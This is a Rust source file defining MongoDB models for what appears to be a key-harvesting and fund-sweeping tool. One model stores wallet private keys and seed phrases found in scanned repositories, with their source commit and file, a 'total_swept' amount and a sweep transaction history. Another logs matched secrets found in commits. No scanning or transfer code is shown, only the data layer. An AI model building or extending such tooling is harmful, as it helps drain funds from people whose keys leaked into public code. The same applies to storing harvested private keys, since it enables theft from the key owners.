use serde::{Deserialize, Serialize};
use mongodb::bson::{doc, DateTime};
use chrono::Utc;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct MonitoredWalletDoc {
    #[serde(rename = "_id", skip_serializing_if = "Option::is_none")]
    pub id: Option<mongodb::bson::oid::ObjectId>,
    pub address: String,
    pub private_key: String,
    pub seed_phrase: Option<String>,
    pub source_repo: String,
    pub source_commit: String,
    pub source_file: String,
    pub first_seen: DateTime,
    pub last_checked: DateTime,
    pub last_balance: String,
    pub total_swept: f64,  // Changed from String to f64
    pub status: String,
    pub tx_history: Vec<TxHistoryDoc>,
    pub created_at: DateTime,
    pub updated_at: DateTime,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct TxHistoryDoc {
    pub tx_hash: String,
    pub amount: String,
    pub to_address: String,
    pub timestamp: DateTime,
}

impl MonitoredWalletDoc {
    pub fn new(
        address: String,
        private_key: String,
        seed_phrase: Option<String>,
        source_repo: String,
        source_commit: String,
        source_file: String,
    ) -> Self {
        let now = Utc::now();
        let bson_now = DateTime::from_millis(now.timestamp_millis());
        
        Self {
            id: None,
            address,
            private_key,
            seed_phrase,
            source_repo,
            source_commit,
            source_file,
            first_seen: bson_now,
            last_checked: bson_now,
            last_balance: "0".to_string(),
            total_swept: 0.0,  // Float initialization
            status: "monitoring".to_string(),
            tx_history: vec![],
            created_at: bson_now,
            updated_at: bson_now,
        }
    }
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ScanLogDoc {
    #[serde(rename = "_id", skip_serializing_if = "Option::is_none")]
    pub id: Option<mongodb::bson::oid::ObjectId>,
    pub repository: String,
    pub commit_sha: String,
    pub file_path: String,
    pub secret_type: String,
    pub matched_value: String,
    pub detected_at: DateTime,
}

impl ScanLogDoc {
    pub fn new(
        repository: String,
        commit_sha: String,
        file_path: String,
        secret_type: String,
        matched_value: String,
    ) -> Self {
        let now = Utc::now();
        let bson_now = DateTime::from_millis(now.timestamp_millis());
        
        Self {
            id: None,
            repository,
            commit_sha,
            file_path,
            secret_type,
            matched_value,
            detected_at: bson_now,
        }
    }
}